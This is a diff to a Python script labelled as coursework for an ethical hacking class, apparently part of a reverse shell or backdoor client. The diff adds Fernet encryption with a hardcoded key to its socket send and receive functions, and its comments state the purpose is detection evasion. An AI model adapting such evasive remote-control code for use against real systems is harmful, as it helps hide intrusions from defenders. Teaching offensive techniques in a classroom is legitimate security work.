@@ -1,5 +1,5 @@
 ################################################
-# Author: Watthanasak Jeamwatthanachai, PhD    #
+# Authors: Korn D.,                            #
 # Class: SIIT Ethical Hacking, 2023-2024       #
 ################################################
 
@@ -9,19 +9,28 @@ import time  # For adding delays
 import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
+from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
+
+# Pre-shared key for encryption
+psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
+cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
-    s.send(jsondata.encode())  # Send the encoded data over the network
+    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data
+    s.send(encrypted_data)  # Send the encrypted data over the network
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
-    data = ''
+    data = b''  # Initialize an empty byte string to hold received data
     while True:
         try:
-            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
-            return json.loads(data)  # Parse the received JSON data
+            data += s.recv(1024)  # Receive data in chunks of 1024 bytes
+            if not data:
+                continue
+            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
+            return json.loads(decrypted_data.decode())  # Parse the received JSON data
         except ValueError:
             continue
 
